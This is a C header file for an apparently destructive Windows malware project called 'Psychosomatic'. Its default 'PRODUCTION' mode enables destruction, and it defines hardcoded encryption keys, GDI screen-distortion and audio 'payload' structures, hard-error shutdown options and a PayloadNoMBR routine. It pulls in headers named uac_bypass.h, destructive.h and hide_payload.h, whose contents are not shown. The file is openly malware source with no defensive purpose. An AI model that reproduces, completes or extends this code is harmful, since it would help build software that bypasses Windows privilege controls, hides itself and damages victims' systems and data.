#pragma once

#include <Windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <Shlobj.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <shlwapi.h>
#include <math.h>
#include <winternl.h>
#include <complex.h>
#include <wininet.h>
#include <windowsx.h>
#include <d3d9.h>

#include "resource.h"

#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "d3d9.lib")
#pragma comment(lib, "Msimg32.lib")

#pragma warning(disable : 4091 4995 6258 6054 6101 6335 6386)
#define PRODUCTION 0
#define UNRELEASED 1

#define PS_MODE PRODUCTION // change this to UNRELEASED to disable all destruction
#define PS_ENCRYPTION_KEY ("psycho")
#define PS_KEY_AES { 'p', 's', 'y', 'c', 'h', 'o', 'p', 's', 'y', 'c', 'h', 'o', 'p', 's', 'y', 'c', 'h', 'o', \
				     'p', 's', 'y', 'c', 'h', 'o', 'p', 's', 'y', 'c', 'h', 'o', 'p', 's' };
#define PS_ENCRYPTION_LAYERS 5
#define DebugMsg(info) (MessageBoxA(NULL, info, "Info", MB_ICONASTERISK))

#define UNLEN 256
#define PS_BLENDFN_HALF ((BLENDFUNCTION){ AC_SRC_OVER, 0, 255, AC_SRC_ALPHA })
#define PS_BLENDFN_NONE ((BLENDFUNCTION){ 0, 0, 0, 0 })
#define PS_BLENDMODE_FUNCTION ULW_ALPHA
#define PS_BLENDMODE_OPAQUE ULW_OPAQUE
#define PS_BLENDMODE_TRANSPARENT_COLOR ULW_COLORKEY
#define PS_DO_NOT_REDRAW 0
#define PS_BLENDMODE(mode, blend_func, transparent_color, fps) ( \
	(LAYERED_WINDOW_BLENDTYPE){ \
	 mode, \
	 blend_func, \
	 transparent_color, \
	 fps })
#define PS_INIT_HEADER GetModuleFileNameW(NULL, selfPath, MAX_PATH);
#define REG_VALUE_MAX_SIZE 16383UL
#define PS_DRUMEX(t, a, b) (sin((DOUBLE)(t)/(a)) * b + 128)
#define PS_DRUM(t) ((DWORD)(PS_DRUMEX(t, (t&4095)+1000, 32)))

#undef RGBQUAD
#define RGBQUAD _RGBQUAD
typedef ULONGLONG TIME_T;
#define M_PI 3.14159265358979323846264338327950288
#define GetTickCountEx() (bTickCount64 ? ((GETTICK64_Fn)GetTickCountAny)() : (ULONGLONG)((GETTICK32_Fn)GetTickCountAny)())
#define GDI_PAYLOAD(payload, duration, prePayload) ( \
	(GDI_PAYLOAD_PARAMS){ payload, duration, NULL, 30, GetSystemMetrics(0), \
	 GetSystemMetrics(1), 0, (LPARAM)NULL, prePayload })
#define AUDIO_PAYLOAD(payload, hz, duration) ( \
	(AUDIO_PARAMS){ payload, hz, 0, duration })
#define PAYLOAD(duration, gdiMain, gdiPre, audioMain, audioHz) ( \
	(PAYLOAD_PARAMS){ GDI_PAYLOAD(gdiMain, duration, gdiPre), \
					  AUDIO_PAYLOAD(audioMain, audioHz, duration) })
#define LAYERED_WINDOW_PAYLOAD(payload, payloadRgb, lParam, blendFn) ( \
	(LAYERED_WINDOW_PARAMS){ payloadRgb, payload, (LPARAM)lParam, blendFn})
#define PsLaunchThread(lpAddress, lpArgument) (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(lpAddress), lpArgument, 0, NULL))
#define PsStartAudioThread(params) (PsLaunchThread(PsAudioThread, &params))
#define PsStopAudioThread(thread) (thread!=0 ? (WaitForSingleObject(thread, -1) && \
								   TerminateThread(thread, 0) && CloseHandle(thread)) : FALSE)
#define LIGHTNESS(v) (RGB(v, v, v))
#define DEG2RAD(deg) ((deg) * (M_PI / 180.))
#define COMPLEX_ABS(real, imag) (sqrt((real) * (real) + (imag) * (imag)))
#define PS_PAYLOAD(lwp, audio, duration) ((PS_PAYLOAD){ audio, lwp, duration })
#define PS_PAYLOAD_DEFAULT(gdiFunction, audioFunction, audioHz, duration, lParam) PS_PAYLOAD(\
	LAYERED_WINDOW_PAYLOAD( \
		gdiFunction, NULL, (LPARAM)(lParam), \
		PS_BLENDMODE(PS_BLENDMODE_FUNCTION, PS_BLENDFN_HALF, 0, 1000) \
	), AUDIO_PAYLOAD(audioFunction, audioHz, duration), duration)
#define PsRunAudioSynchronous(ad) for(HANDLE i = PsStartAudioThread(ad); !(PsStopAudioThread(i) || 1);)
typedef ULONG FPS;
#define choice(a, b) ((rand() % 2) ? (a) : (b))

#if PS_MODE == PRODUCTION
	#define PS_PAYLOAD_LENGTH 30
#else
	#define PS_PAYLOAD_LENGTH 5
#endif

#define GDI_SHADER_NO_FUNCTION NULL
#define GDI_SHADER_FPS_DEAFULT 30
#define RAISE_AN_EXCEPTION ((void(*))(NULL))(); ExitProcess(1);

typedef DWORD    (WINAPI* GETTICK32_Fn)();
typedef ULONGLONG(WINAPI* GETTICK64_Fn)();

extern FAR* GetTickCountAny;
extern BOOL bTickCount64;
extern BOOL ExtracedDLL;

extern COLORREF mandelbrotPalette[256];
extern COLORREF mandelbrotNavyPalette[256];
extern WCHAR wUsernamePath[256];
extern WCHAR PsychosomaticDLLPath[MAX_PATH];

VOID WINAPI PsInitTickCountAny(void);

typedef union __rgb {
	struct {
		UCHAR r;
		UCHAR g;
		UCHAR b;
		UCHAR reserved;
	};
	COLORREF rgb;
} RGBQUAD, * PRGBQUAD;

typedef void (WINAPI* AUDIO_CALLBACK)(PSHORT, LONG, LPARAM);
typedef void (WINAPI* GDI_PAYLOAD_FUNC)(PRGBQUAD, PRGBQUAD, HDC, INT, TIME_T, INT, INT, LPARAM);
typedef void (WINAPI* GDI_PAYLOAD_PRE)(HDC, INT, TIME_T, INT, INT, LPARAM);
typedef void (WINAPI* GDI_PAYLOAD_LAYERED)(HDC, HDC, HBITMAP, INT, INT, TIME_T, LPARAM);

typedef struct __LAYERED_WINDOW_BLENDTYPE {
	UINT uBlendMode;
	BLENDFUNCTION blendFn;
	COLORREF transparentClr;
	FPS fps;
} LAYERED_WINDOW_BLENDTYPE, *PLAYERED_WINDOW_BLENDTYPE;

typedef struct __AUDIO_PARAMS {
	AUDIO_CALLBACK AudioFunc;
	DWORD dwHertz;
	LPARAM lParam;
	DWORD dwReserved;
} AUDIO_PARAMS, * PAUDIO_PARAMS, * LPAUDIO_PARAMS;

typedef struct __GDI_PAYLOAD_PARAMS {
	GDI_PAYLOAD_FUNC PayloadFunc;
	DWORD dwDurationInSeconds;
	HDC hdc;
	FPS fps;
	INT w;
	INT h;
	DWORD dwStartPosInSeconds;
	LPARAM lParam;
	GDI_PAYLOAD_PRE PreFunc;
} GDI_PAYLOAD_PARAMS, * PGDI_PAYLOAD_PARAMS, * LPGDI_PAYLOAD_PARAMS;

typedef struct __PAYLOAD_PARAMS {
	GDI_PAYLOAD_PARAMS GdiPayload;
	AUDIO_PARAMS AudioPayload;
} PAYLOAD_PARAMS, * PPAYLOAD_PARAMS, * LPPAYLOAD_PARAMS;

typedef struct _LAYERED_WINDOW_PARAMS {
	GDI_PAYLOAD_FUNC gdiRgbPayload;
	GDI_PAYLOAD_LAYERED gdiPayload;
	LPARAM lParam;
	LAYERED_WINDOW_BLENDTYPE blendMode;
} LAYERED_WINDOW_PARAMS;

typedef struct _RESERVED_LAYERED_WINDOW_DATA {
	LAYERED_WINDOW_PARAMS* plWp;
	HDC memDc;
	HDC hdc;
	INT w;
	INT h;
	BLENDFUNCTION blendFn;
	TIME_T tickStart;
	POINT wndSzStart;
	SIZE wndSzEnd;
	HDC desk;
	HBITMAP memBitmap;
} RESERVED_LAYERED_WINDOW_DATA, *PRESERVED_LAYERED_WINDOW_DATA;

typedef struct __LWD_REDRAW_THREAD_ARGS {
	LAYERED_WINDOW_PARAMS lwp;
	PRESERVED_LAYERED_WINDOW_DATA plWp;
	HWND hWnd;
} LWD_REDRAW_THREAD_ARGS, * PLWD_REDRAW_THREAD_ARGS;

typedef struct _RESERVED_LWD_DATA_THREAD {
	LAYERED_WINDOW_PARAMS lwp;
	PRESERVED_LAYERED_WINDOW_DATA pplWd;
	HWND* pHwnd;
	WCHAR pclassName[28];
	HINSTANCE* phInst;
	ULONGLONG* pSeed;
	PBOOL pumpWhile;
	BOOL output;
	HANDLE hThread;
	HANDLE redrawThread;
	PLWD_REDRAW_THREAD_ARGS pRdta;
	BOOL bFreed;
} RESERVED_LWD_DATA_THREAD, *PRESERVED_LWD_DATA_THREAD, *LPRESERVED_LWD_DATA_THREAD;

typedef struct _PROC_THREAD_ATTRIBUTE_ENTRY {
	DWORD_PTR Attribute;
	SIZE_T cbSize;
	PVOID lpValue;
} PROC_THREAD_ATTRIBUTE_ENTRY, * LPPROC_THREAD_ATTRIBUTE_ENTRY;

typedef struct _PROC_THREAD_ATTRIBUTE_LIST {
	DWORD dwFlags;
	ULONG Size;
	ULONG Count;
	ULONG Reserved;
	PULONG Unknown;
	PROC_THREAD_ATTRIBUTE_ENTRY Entries[ANYSIZE_ARRAY];
} PROC_THREAD_ATTRIBUTE_LIST, * LPPROC_THREAD_ATTRIBUTE_LIST;

extern WCHAR selfPath[MAX_PATH];
#define wcsequ(str1, str2) (!wcscmp(str1, str2))

typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, * PHARDERROR_RESPONSE_OPTION;

typedef RESERVED_LWD_DATA_THREAD PS_LAYERED_WINDOW;

typedef struct PS_LW_AND_AUDIO_PAYLOAD {
	AUDIO_PARAMS ad;
	LAYERED_WINDOW_PARAMS lwp;
	DWORD dwDurationInSeconds;
} PS_PAYLOAD, NEAR *PPS_PAYLOAD, FAR *LPPS_PAYLOAD;

#define EVP_MAX_BLOCK_LENGTH 32
void WINAPI PayloadNoMBR();

#include "engine.h"
#include "uac_bypass.h"
#include "shader.h"
#include "destructive.h"
#include "3d_payload.h"
#include "hide_payload.h"